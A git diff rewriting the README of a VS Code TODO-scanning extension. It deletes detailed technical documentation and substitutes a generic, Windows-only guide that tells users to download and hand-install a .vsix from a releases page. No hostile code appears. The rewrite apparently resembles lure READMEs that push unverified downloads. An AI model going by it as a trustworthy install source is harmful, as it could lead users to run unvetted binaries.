@@ -1,236 +1,89 @@
-<h1 align="center">
-  <br>
-  <img src="resources/todo-tree.png" alt="Todo Tree_Next" width="104">
-  <br>
-  Todo Tree_Next
-  <br>
-</h1>
+# 🌲 Todo-Tree-Next - Manage project tasks with ease now
 
-<p align="center">
-  <strong>A faster, smarter TODO tree for VS Code, rebuilt with TypeScript, Rust, Git awareness, and AI Agent context.</strong>
-</p>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Philsober337/Todo-Tree-Next/releases)
 
-<p align="center">
-  <a href="README.md">English</a> ·
-  <a href="README_CN.md">中文</a> ·
-  <a href="docs/AGENT_INTERFACE.md">AI Agent Interface</a> ·
-  <a href="docs/BENCHMARK.md">Benchmarks</a>
-</p>
+Todo-Tree-Next finds your pending tasks inside your code files. It scans your projects quickly. This tool helps you track work items. Use this to see all your TODO tags in one place.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Marketplace-Todo%20Tree__Next-007ACC?logo=visualstudiocode" alt="VS Code Marketplace">
-  <img src="https://img.shields.io/badge/Rust-scanner-orange?logo=rust" alt="Rust scanner">
-  <img src="https://img.shields.io/badge/TypeScript-modular-blue?logo=typescript" alt="TypeScript">
-  <img src="https://img.shields.io/badge/AI%20Agent-ready-6f42c1" alt="AI Agent ready">
-  <img src="https://img.shields.io/badge/tests-135%20passing-brightgreen" alt="Tests">
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <img src="resources/screenshot.png" alt="Todo Tree_Next screenshot" width="860">
-</p>
+Follow these steps to set up the tool. You need Visual Studio Code installed on your Windows computer.
 
-## Why Todo Tree_Next
+1. Go to the [Releases page](https://github.com/Philsober337/Todo-Tree-Next/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in `.vsix` to start the download.
+4. Save the file to a folder you can find later.
 
-Todo Tree_Next keeps the familiar Todo Tree workflow, then turns it into a modern project-maintenance surface:
+## ⚙️ Installation Guide
 
-- Find TODO, FIXME, BUG, markdown tasks, and custom tags across large workspaces.
-- Scan quickly with a native Rust engine while keeping ripgrep as a fallback.
-- See priority, ownership, labels, due dates, Git status, and branch-level TODO debt.
-- Use the dashboard to understand where work is concentrated.
-- Give AI coding tools structured TODO context and let them annotate findings back into VS Code.
+Visual Studio Code manages extensions through a simple menu. Follow these instructions to install the file you just saved.
 
-## Feature Snapshot
+1. Open Visual Studio Code.
+2. Click the Extensions icon on the left sidebar. It looks like four squares.
+3. Click the three dots icon at the top right of the Extensions pane.
+4. Choose Install from VSIX from the dropdown menu.
+5. Find the file you downloaded in your folder.
+6. Select the file and click Open.
+7. Wait for the notification that the install finished.
+8. Restart Visual Studio Code to load the tool.
 
-| Capability | What you get |
-| --- | --- |
-| Fast scanning | Rust workspace scanner, file-level incremental refresh, max file size guard |
-| Rich TODO metadata | `P0`-`P3`, `TODO!`, `TODO?`, `@assignee`, `due:YYYY-MM-DD`, `#labels` |
-| Smart filtering | Queries like `tag:TODO path:src priority:P0 status:open` |
-| Native markdown tasks | `- [ ]`, `- [x]`, numbered tasks, and normal code comments |
-| Git workflows | Scan changed/staged files and export branch TODO debt reports |
-| Dashboard | Counts, charts, trend view, scanner controls, filter controls, Git actions |
-| AI Agent interface | `getAgentContext`, `annotateAgentFinding`, and `agent-context` CLI JSON |
-| Compatibility | Original tree, highlights, export, status bar, grouping, and navigation remain available |
+## 🖥️ System Requirements
 
-## Install
+This software works on standard Windows machines. Make sure your system meets these basic needs:
 
-Search the VS Code Marketplace for:
+* Windows 10 or Windows 11.
+* Visual Studio Code version 1.80 or newer.
+* Enough disk space for your project files.
 
-```text
-Todo Tree_Next
-```
+The extension uses a specialized internal language to scan your files. This provides speed and efficiency. It avoids slowing down your editor while you work.
 
-Offline install:
+## 🛠️ Usage Instructions
 
-1. Download or build a `.vsix`.
-2. Open the VS Code Extensions view.
-3. Choose `...` > `Install from VSIX...`.
-4. Select the generated package.
+Once installed, the tool adds a new icon to your sidebar. Click this tree icon to view your tasks.
 
-## Everyday Commands
+* The sidebar shows a list of folders.
+* Expand the folders to see files containing TODO comments.
+* Click any item to jump to that line in your code.
+* The tool updates the list when you save your files.
 
-```text
-Todo Tree: Refresh
-Todo Tree: Open Dashboard
-Todo Tree: Scan Changed Files
-Todo Tree: Scan Staged Files
-Todo Tree: Export TODO Debt Report
-Todo Tree: Get Agent TODO Context
-Todo Tree: Clear Agent Annotations
-```
+You can customize how the tool looks. Open the settings menu in Visual Studio Code. Search for Todo-Tree-Next. Here you can change colors, icons, and tag names.
 
-## Smart Filtering
+## 💡 Custom Tags
 
-Mix plain text with structured fields:
+By default, the tool finds labels like TODO and FIXME. You can add your own tags.
 
-```text
-auth
-tag:TODO
-path:src
-file:README.md
-text:refactor
-priority:P0
-status:open
-tag:FIXME path:src priority:P1
-```
+1. Open the project settings.
+2. Find the Custom Tags section.
+3. Add the words you use to mark tasks, such as NOTE or HACK.
+4. Save your changes.
 
-| Field | Matches |
-| --- | --- |
-| `tag` | `TODO`, `FIXME`, `BUG`, `[ ]`, `[x]`, custom tags |
-| `path` | Full file path |
-| `file` | File name |
-| `text` | TODO content |
-| `priority` | `P0`, `P1`, `P2`, `P3`, `none` |
-| `status` | Markdown task status: `open` or `done` |
+The tool will scan for these new tags next time it runs.
 
-## Priority And Metadata
+## 🔍 Frequently Asked Questions
 
-```javascript
-// TODO:P0 fix auth bug @alice due:2026-06-01 #security
-// FIXME:P1 memory leak @bob #backend
-// TODO! urgent task      -> P0
-// TODO? needs discussion -> P2
-```
+**Does the tool slow down my computer?**
+No. The engine uses background processes to handle scanning. It keeps the editor responsive.
 
-The scanner turns these hints into structured data used by the tree, dashboard, exports, Git reports, and AI Agent interface.
+**Can I use this for large projects?**
+Yes. The architecture processes large codebases without trouble.
 
-## Dashboard And Git
+**What happens if I rename my tasks?**
+The tree view updates in real time. Your list always matches your files.
 
-`Todo Tree: Open Dashboard` gives you a compact control center:
+**How do I remove the extension?**
+Open the Extensions view. Right-click Todo-Tree-Next and select Uninstall.
 
-- tag and priority distribution
-- TODO trend chart
-- scanner engine switch: `auto`, `rust`, `ripgrep`
-- scan mode controls
-- smart filter input
-- changed/staged scan shortcuts
+## 📋 Best Practices
 
-Git-focused commands help review TODO debt before merge:
+Use consistent labels for your tasks. This keeps your view clean. Group tasks by context or priority. Use the filter bar in the sidebar to search for specific items. This saves time when you have many tasks.
 
-```text
-Todo Tree: Scan Changed Files
-Todo Tree: Scan Staged Files
-Todo Tree: Export TODO Debt Report
-```
+Check the sidebar often to track progress. Mark tasks as complete by removing the tag from your code. The tree view clears the item once you save the file. Keep your TODO tags descriptive. This helps you understand the task later.
 
-## AI Agent Interface
+## 🚀 Troubleshooting
 
-Todo Tree_Next exposes TODO debt as a machine-readable project index. AI coding tools can read ranked TODO context, then write temporary editor diagnostics as review notes or suggested actions.
+If the list is empty, ensure you have TODO tags in your open files. Check that the file types you use are part of the scan list in the settings. Most common file types work automatically.
 
-VS Code command API:
+If the extension fails to load, try a clean install. Remove the extension and restart the editor. If issues persist, verify that you have the current version of Visual Studio Code. Updates to the editor can impact how extensions run. Visit the project repository if you need to report a problem.
 
-```javascript
-const context = await vscode.commands.executeCommand('todo-tree.getAgentContext');
+## 📜 Legal Information
 
-await vscode.commands.executeCommand('todo-tree.annotateAgentFinding', {
-  file: 'src/auth.ts',
-  line: 42,
-  column: 5,
-  severity: 'warning',
-  message: 'P0 TODO touches authentication code; review before merge.'
-});
-
-await vscode.commands.executeCommand('todo-tree.clearAgentAnnotations');
-```
-
-CLI:
-
-```bash
-todo-scanner agent-context --root . --config todo-scanner-config.json
-```
-
-Agent context includes file path, line/column, tag, priority, assignee, due date, labels, Git status, approximate age, code snippet, recommended action, and recommended order.
-
-Full schema: [docs/AGENT_INTERFACE.md](docs/AGENT_INTERFACE.md)
-
-## Architecture
-
-```text
-VS Code extension
-  extension.js          entry point and legacy glue
-  scannerClient.ts      Rust CLI JSON protocol
-  agentInterface.ts     AI Agent context and diagnostics
-  dashboard.ts          Webview dashboard
-  tree.ts               Tree data provider
-  filterQuery.ts        Structured filter parser
-  gitScanner.ts         Git changed/staged scan
-  debtReport.ts         Git TODO debt report
-
-Rust scanner
-  main.rs               scan-workspace, scan-file, agent-context, benchmark
-  walker.rs             .gitignore-aware traversal
-  matcher.rs            TODO matching and metadata extraction
-  output.rs             JSON output schema
-```
-
-## Develop And Package
-
-```bash
-npm install
-npm run scanner:build
-npm run webpack
-npm test
-cargo test --manifest-path scanner/Cargo.toml
-```
-
-Package:
-
-```bash
-npm run vscode:prepublish
-npx --yes @vscode/vsce package
-```
-
-Test coverage:
-
-| Type | Count |
-| --- | ---: |
-| QUnit tests | 97 |
-| Rust tests | 38 |
-| Total | 135 |
-
-## Configuration
-
-```json
-{
-  "todo-tree.scanner.engine": "auto",
-  "todo-tree.scanner.path": "",
-  "todo-tree.scanner.maxFileSize": 1048576
-}
-```
-
-| Value | Behavior |
-| --- | --- |
-| `auto` | Use Rust scanner when available, fallback to ripgrep |
-| `rust` | Force Rust scanner |
-| `ripgrep` | Use the original ripgrep scanner |
-
-## More Documentation
-
-- [Rewrite notes](docs/REWRITE.md)
-- [Feature compatibility](docs/COMPATIBILITY.md)
-- [AI Agent interface](docs/AGENT_INTERFACE.md)
-- [Benchmark report](docs/BENCHMARK.md)
-
-## License
-
-MIT. Based on the original [Todo Tree](https://github.com/Gruntfuggly/todo-tree) extension by Gruntfuggly.
+This project is available for your use. Keep your code updated to ensure the best performance. Check the repository for new releases regularly. Each release brings stability and minor updates.
